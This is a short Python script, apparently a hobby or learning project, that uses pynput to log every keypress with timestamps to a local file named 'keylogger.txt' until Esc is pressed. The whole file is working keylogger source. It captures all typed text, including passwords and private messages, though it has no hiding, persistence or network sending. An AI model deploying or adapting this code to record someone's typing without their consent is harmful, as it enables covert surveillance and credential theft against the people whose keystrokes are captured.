
from pynput.keyboard import Listener, Key #listens keys
import datetime #timestamping

#file where keys are supposed to be saved
Logged_File = "keylogger.txt"

def log_key(key):#function for key specification and data collection
    try:
        # timestamping
        time = datetime.datetime.now().strftime("%d:%m:%Y %H:%M:%S") 
        # writing into the file
        with open(Logged_File, "a") as file:
            #characters
            if hasattr(key, 'char'):  
                file.write(key.char)
            #space
            elif key == Key.space:
                file.write(" ")
            #backspace
            elif key == Key.backspace:
                file.write(f"[backspace]  {time}\n")
            #shift
            elif key == Key.shift:
                file.write(f"[shift] {time}\n")
            #ctrl
            # elif key == key.ctrl:
            #     file.write(f"[ctrl] , {time}\n")
            #tab
            elif key == Key.tab:
                file.write(f"[tab] {time}\n")
            #capslock
            elif key == Key.caps_lock:  
                file.write(f"[caps lock] {time}")
            #enter
            elif key == Key.enter:
                file.write(f"[enter] {time}\n")
            elif key == Key.esc:
                file.write(f"[esc] {time}\n")
            #unknown keys
            else:
                file.write(f"[{key}]` {time}\n")  
    #error            
    except AttributeError:
        print(f"key not found")

def on_press(key):
    log_key(key)  #saves the logged key
    if key == Key.esc: # Use esc to stop
        
        print("Stopping keylogger...")
        return False  # This stops the listener
    



with Listener(on_press=on_press) as listener: #listens pressed key 
    # print(f"{Logged_File}")
    listener.join()



            
            
            
